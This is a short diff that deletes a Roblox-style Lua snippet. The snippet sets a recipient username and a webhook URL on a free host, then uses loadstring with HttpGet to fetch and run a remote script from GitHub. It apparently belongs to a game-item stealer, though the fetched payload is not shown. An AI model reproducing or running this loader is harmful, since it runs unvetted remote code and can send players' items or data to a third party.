@@ -1,5 +1,0 @@
-UserName = "fahad3ss4"
-WebHook = "https://webhookprotection.000webhostapp.com/db/63251174937439598/index.php"
-Mention = true -- change to false if you don't want to get everyone ping in your webhook.
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
